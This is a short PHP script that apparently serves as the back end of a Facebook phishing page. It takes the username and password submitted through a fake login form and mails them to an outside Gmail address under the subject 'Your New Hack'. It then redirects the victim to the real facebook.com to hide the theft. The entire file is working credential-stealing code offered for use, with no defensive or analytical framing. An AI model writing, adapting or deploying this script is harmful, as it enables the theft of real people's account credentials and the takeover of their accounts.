<?php
$username=$_POST['username'];
$password=$_POST['password'];
$to_email = "scanpain@gmail.com";
$subject = "Your New Hack";
$body = "Username is : ".$username."  And Password is: ".$password;
$headers = "From: videosdramachannel2019@gmail.com";

if (mail($to_email, $subject, $body, $headers)) {
    //echo "Email successfully sent to $to_email...";
    header("location: https://www.facebook.com/");
} else {
    echo "Registration failed...";
}
